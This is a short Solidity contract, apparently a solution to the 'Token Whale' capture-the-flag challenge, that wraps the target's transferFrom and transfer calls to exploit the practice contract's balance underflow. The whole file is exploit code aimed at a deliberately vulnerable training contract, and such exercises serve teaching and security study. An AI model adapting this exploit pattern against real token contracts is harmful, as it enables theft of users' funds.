pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract AttackTokenWhaleChallenge{
    TokenWhaleChallenge tokenWhaleChallenge;

    function AttackTokenWhaleChallenge(address contractAddress) public{
        tokenWhaleChallenge = TokenWhaleChallenge(contractAddress);
    }

    function attack(address from, address to, uint256 value) public{
        tokenWhaleChallenge.transferFrom(from, to, value);
    }
    function transfer(address to, uint256 value) public{
        tokenWhaleChallenge.transfer(to, value);
    }
}